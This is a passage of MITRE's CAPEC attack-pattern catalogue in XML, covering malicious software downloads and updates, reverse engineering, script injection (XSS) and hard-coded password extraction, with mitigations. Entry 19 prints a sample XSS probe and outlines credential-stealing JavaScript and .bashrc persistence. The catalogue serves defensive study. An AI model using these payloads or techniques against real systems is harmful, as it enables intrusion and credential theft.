               <Modification_Comment>Updated Activation_Zone, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Software Integrity Attacks</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="185" Name="Malicious Software Download" Abstraction="Standard" Status="Draft">
         <Description>An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code that originates from an attacker controlled source. There are several variations to this strategy of attack.</Description>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="184"/>
         </Related_Attack_Patterns>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="494"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1176</Entry_ID>
               <Entry_Name>Browser Extensions</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="186" Name="Malicious Software Update" Abstraction="Standard" Status="Draft">
         <Description>An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an attacker controlled source. Although there are several variations to this strategy of attack, the attack methods are united in that all rely on the ability of an attacker to position and disguise malicious content such that it masquerades as a legitimate software update which is then processed by a program, undermining application integrity. As such the attack employs 'spoofing' techniques augmented by psychological or technological mechanisms to disguise the update and/or its source. Virtually all software requires frequent updates or patches, giving the attacker immense latitude when structuring the attack, as well as many targets of opportunity. Attacks involving malicious software updates can be targeted or untargeted in reference to a population of users, and can also involve manual and automatic means of payload installation. Untargeted attacks rely upon a mass delivery system such as spamming, phishing, or trojans/botnets to distribute emails or other messages to vast populations of users. Targeted attacks aim at a particular demographic or user population. Corporate Facebook or Myspace pages make it easy to target users of a specific company or affiliation without relying on email address harvesting or spamming. One phishing-assisted variation on this attack involves hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update. This type of attack has also been conducted using an Instant Messaging virus payload, which harvests the names from a user's contact list and sends instant messages to those users to download and apply the update. While both methods involve a high degree of automated mechanisms to support the attack, the primary vector for achieving the installation of the update remains a manual user-directed process, although clicking a link within an IM client or web application may initiate the update. Other class of attacks focus on firmware, where malicious updates are made to the core system firmware or BIOS. Since this occurs outside the controls of the operating system, the OS detection and prevention mechanisms do not aid, thus allowing an adversary to evade defenses as well as gain persistence on the target's system. Automated attacks involving malicious software updates require little to no user-directed activity and are therefore advantageous because they avoid the complex preliminary setup stages of manual attacks, which must effectively 'hook' users while avoiding countermeasures such as spam filters or web security filters.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="184"/>
         </Related_Attack_Patterns>
         <Skills_Required>
            <Skill Level="High">This attack requires advanced cyber capabilities</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the attacker to host a payload and then trigger the installation of the payload code.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Availability</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Utilize the built-in software update mechanisms of the commercial components to deliver software that could compromise security credentials, enable a denial-of-service attack, or enable tracking.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Validate software updates before installing.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="494"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="187" Name="Malicious Automated Software Update" Abstraction="Detailed" Status="Draft">
         <Description>An attacker exploits a weakness in a server or client's process of delivering and verifying the integrity of code supplied by an update-providing server or mechanism to cause code of the attackers' choosing to be downloaded and installed as a software update. Attacks against automated update mechanisms involve attack vectors which are specific to the type of update mechanism, but typically involve two different attack strategies: redirection or spoofing. Redirection-based attacks exploit two layers of weaknesses in server or client software to undermine the integrity of the target code-base. The first weakness involves a failure to properly authenticate a server as a source of update or patch content. This type of weakness typically results from authentication mechanisms which can be defeated, allowing a hostile server to satisfy the criteria that establish a trust relationship. The second weakness is a systemic failure to validate the identity and integrity of code downloaded from a remote location, hence the inability to distinguish malicious code from a legitimate update. One predominate type of redirection attack requires DNS spoofing or hijacking of a domain name corresponding to an update server. The target software initiates an update request and the DNS request resolves the domain name of the update server to the IP address of the attacker, at which point the software accepts updates either transmitted by or pulled from the attackers' server. Attacks against DNS mechanisms comprise an initial phase of a chain of attacks that facilitate automated update hijacking attack, and such attacks have a precedent in targeted activities that have been as complex as DNS/BIND attacks of corporate infrastructures, to untargeted attacks aimed at compromising home broadband routers, as well as attacks involving the compromise of wireless access points, as well as 'evil twin' attacks coupled with DNS redirection. Due to the plethora of options open to the attacker in forcing name resolution to arbitrary servers the Automated Update Hijacking attack strategies are the tip of the spear for many multi-stage attack chains. The second weakness that is exploited by the attacker is the lack of integrity checking by the software in validating the update. Software which relies only upon domain name resolution to establish the identity of update code is particularly vulnerable, because this signals an absence of other security countermeasures that could be applied to invalidate the attackers' payload on basis of code identity, hashing, signing, encryption, and other integrity checking mechanisms. Redirection-based attack patterns work equally well against client-side software as well as local servers or daemons that provide software update functionality. One precedent of redirection-based attacks involves the active exploitation of Firefox extensions, such as the Google Toolbar, Yahoo Toolbar, Facebook Toolbar, and others. The second strategy employed in Automated Hijacking Attacks are spoofing strategies, including content or identity spoofing, as well as protocol spoofing. Content or identity spoofing attacks can trigger updates in software by embedding scripted mechanisms within a malicious web page, which masquerades as a legitimate update source. Scripting mechanisms communicate with software components and trigger updates from locations specified by the attackers' server. Such attacks have numerous precedents, one in particular being eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attackers' code without integrity checking.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="186"/>
         </Related_Attack_Patterns>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="494"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1017</Entry_ID>
               <Entry_Name>Application Deployment Software</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Architectural_Paradigms, Injection_Vector, Payload, Payload_Activation_Impact, References, Technical_Context</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="188" Name="Reverse Engineering" Abstraction="Meta" Status="Stable">
         <Description>An adversary discovers the structure, function, and composition of an object, resource, or system by using a variety of analysis techniques to effectively determine how the analyzed entity was constructed or operates. The goal of reverse engineering is often to duplicate the function, or a part of the function, of an object in order to duplicate or "back engineer" some aspect of its functioning. Reverse engineering techniques can be applied to mechanical objects, electronic devices, or software, although the methodology and techniques involved in each type of analysis differ widely.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Prerequisites>
            <Prerequisite>Access to targeted system, resources, and information.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Understanding of low level programming languages or technologies can be very helpful. For example, when reverse engineering a binary file, an understanding of assembly languages can help to determine the purpose and inner-workings of the code. Another example is reverse engineering an application that relies on networking. Here, an understanding networking protocols can provide insight into application details.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The technical resources necessary to engage in reverse engineering differ in accordance with the type of object, resource, or system being analyzed.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Employ code obfuscation techniques to prevent the adversary from reverse engineering the targeted entity.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>When adversaries are reverse engineering software, methodologies fall into two broad categories, 'white box' and 'black box.' White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution. 'Black Box' methods involve interacting with the software indirectly, in the absence of the ability to measure, instrument, or analyze an executable object directly. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-50" Section="Reverse engineering"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Examples-Instances, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="189" Name="Black Box Reverse Engineering" Abstraction="Standard" Status="Draft">
         <Description>An attacker discovers the structure, function, and composition of a type of computer software through black box analysis techniques. 'Black Box' methods involve interacting with the software indirectly, in the absence of direct access to the executable object. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="188"/>
         </Related_Attack_Patterns>
         <Resources_Required>
            <Resource>Black box methods require (at minimum) the ability to interact with the functional boundaries where the software communicates with a larger processing environment, such as inter-process communication on a host operating system, or via networking protocols.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Software Reverse Engineering</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="19" Name="Embedding Scripts within Scripts" Abstraction="Standard" Status="Stable">
         <Description>An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. The adversary leverages this capability to execute his/her own script by embedding it within other scripts that the target software is likely to execute. The adversary must have the ability to inject their script into a script that is likely to be executed. If this is done, then the adversary can potentially launch a variety of probes and attacks against the web server's local environment, in many cases the so-called DMZ, back end resources the web server can communicate with, and other hosts. With the proliferation of intermediaries, such as Web App Firewalls, network devices, and even printers having JVMs and Web servers, there are many locales where an attacker can inject malicious scripts. Since this attack pattern defines scripts within scripts, there are likely privileges to execute said attack on the host. These attacks are not solely limited to the server side, client side scripts like Ajax and client side JavaScript can contain malicious scripts as well.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="242"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Spider] Using a browser or an automated tool, an attacker records all entry points for inputs that happen to be reflected in a client-side script element. These script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.</Description>
               <Technique>Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.</Description>
               <Technique>Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.</Technique>
               <Technique>Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.</Technique>
               <Technique>Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.</Technique>
               <Technique>Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.</Technique>
               <Technique>Use a proxy tool to record results of the created requests.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To load malicious script into open, e.g. world writable directory</Skill>
            <Skill Level="Medium">Executing remote scripts on host and collecting output</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use browser technologies that do not allow client side scripting.</Mitigation>
            <Mitigation>Utilize strict type, character, and encoding enforcement.</Mitigation>
            <Mitigation>Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.</Mitigation>
            <Mitigation>Ensure all content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Perform input validation for all remote content.</Mitigation>
            <Mitigation>Perform output validation for all remote content.</Mitigation>
            <Mitigation>Disable scripting languages such as JavaScript in browser</Mitigation>
            <Mitigation>Session tokens for specific host</Mitigation>
            <Mitigation>Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</Mitigation>
            <Mitigation>Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an attacker may exploit in this instance are the relative lack of security features in JavaScript and the various browser's implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many attackers take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;IMG SRC=javascript:alert('XSS')&gt;</xhtml:div>
               <xhtml:p>The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of.</xhtml:p>
               <xhtml:p>In addition the enumerations allow for the attacker to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments.</xhtml:p>
            </Example>
            <Example>~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1156</Entry_ID>
               <Entry_Name>.bash_profile and .bashrc</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Examples-Instances, References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="190" Name="Reverse Engineer an Executable to Expose Assumed Hidden Functionality" Abstraction="Detailed" Status="Draft">
         <Description>An attacker analyzes a binary file or executable for the purpose of discovering the structure, function, and possibly source-code of the file by using a variety of analysis techniques to effectively determine how the software functions and operates. This type of analysis is also referred to as Reverse Code Engineering, as techniques exist for extracting source code from an executable. Several techniques are often employed for this purpose, both black box and white box. The use of computer bus analyzers and packet sniffers allows the binary to be studied at a level of interactions with its computing environment, such as a host OS, inter-process communication, and/or network communication. This type of analysis falls into the 'black box' category because it involves behavioral analysis of the software without reference to source code, object code, or protocol specifications.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="167"/>
         </Related_Attack_Patterns>
         <Resources_Required>
            <Resource>Access to the target file such that it can be analyzed with the appropriate tools. A range of tools suitable for analyzing an executable or its operations</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="912"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-51" Section="Decompiler"/>
            <Reference External_Reference_ID="REF-52" Section="Debugger"/>
            <Reference External_Reference_ID="REF-53" Section="Disassembler"/>
         </References>
         <Notes>
            <Note Type="Other">
               <xhtml:p>White box analysis techniques include file or binary analysis, debugging, disassembly, and decompilation, and generally fall into categories referred to as 'static' and 'dynamic' analysis. Static analysis encompasses methods which analyze the binary, or extract its source code or object code without executing the program. Dynamic analysis involves analyzing the program during execution.</xhtml:p>
               <xhtml:p>Some forms of file analysis tools allow the executable itself to be analyzed, the most basic of which can analyze features of the binary. More sophisticated forms of static analysis analyze the binary file and extract assembly code, and possibly source code representations, from analyzing the structure of the file itself. Dynamic analysis tools execute the binary file and monitor its in memory footprint, revealing its execution flow, memory usage, register values, and machine instructions. This type of analysis is most effective for analyzing the execution of binary files whose content has been obfuscated or encrypted in its native executable form.</xhtml:p>
               <xhtml:p>Debuggers allow the program's execution to be monitored, and depending upon the debugger's sophistication may show relevant source code for each step in execution, or may display and allow interactions with memory, variables, or values generated by the program during run-time operations. Disassemblers operate in reverse of assemblers, allowing assembly code to be extracted from a program as it executes machine code instructions. Disassemblers allow low-level interactions with the program as it executes, such as manipulating the program's run time operations. Decompilers can be utilized to analyze a binary file and extract source code from the compiled executable. Collectively, the tools and methods described are those commonly applied to a binary executable file and provide means for reverse engineering the file by revealing the hidden functions of its operation or composition.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, Other_Notes, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated @Name, Notes, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2019-04-04">Reverse Engineer an Executable to Expose Assumed Hidden Functionality or Content</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="191" Name="Read Sensitive Strings Within an Executable" Abstraction="Detailed" Status="Draft">
         <Description>An adversary engages in activities to discover any sensitive strings are present within the compiled code of an executable, such as literal ASCII strings within the file itself, or possibly strings hard-coded into particular routines that can be revealed by code refactoring methods including static and dynamic analysis. One specific example of a sensitive string is a hard-coded password. Typical examples of software with hard-coded passwords include server-side executables which may check for a hard-coded password or key during a user's authentication with the server. Hard-coded passwords can also be present in client-side executables which utilize the password or key when connecting to either a remote component, such as a database server, licensing server, or otherwise, or a processes on the same host that expects a key or password. When analyzing an executable the adversary may search for the presence of such strings by analyzing the byte-code of the file itself. Example utilities for revealing strings within a file include 'strings,' 'grep,' or other variants of these programs depending upon the type of operating system used. These programs can be used to dump any ASCII or UNICODE strings contained within a program. Strings can also be searched for using a hex editors by loading the binary or object code file and utilizing native search functions such as regular expressions.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="167"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to a binary or executable such that it can be analyzed by various utilities.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Binary analysis programs such as 'strings' or 'grep', or hex editors.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="798"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1081</Entry_ID>
               <Entry_Name>Credentials in files</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-51" Section="Decompiler"/>
            <Reference External_Reference_ID="REF-52" Section="Debugger"/>
            <Reference External_Reference_ID="REF-53" Section="Disassembler"/>
         </References>
         <Notes>
            <Note Type="Other">
               <xhtml:p>More sophisticated methods of searching for sensitive strings within a file involve disassembly or decompiling of the file. One could, for example, utilize disassembly methods on an ISAPI executable or dll to discover a hard-coded password within the code as it executes. This type of analysis usually involves four stages in which first a debugger is attached to the running process, anti-debugging countermeasures are circumvented or bypassed, the program is analyzed step-by-step, and breakpoints are established so that discrete functions and data structures can be analyzed.</xhtml:p>
               <xhtml:p>Debugging tools such as SoftICE, Ollydbg, or vendor supplied debugging tools are often used. Disassembly tools such as IDA pro, or similar tools, can also be employed. A third strategy for accessing sensitive strings within a binary involves the decompilation of the file itself into source code that reveals the strings. An example of this type of analysis involves extracting source code from a java JAR file and then using functionality within a java IDE to search the source code for sensitive, hard-coded information. In performing this analysis native java tools, such as "jar" are used to extract the compiled class files. Next, a java decompiler such as "DJ" is used to extract java source code from the compiled classes, revealing source code. Finally, the source code is audited to reveal sensitive information, a step that is usually assisted by source code analysis programs.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, Other_Notes, References, Related_Attack_Patterns, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
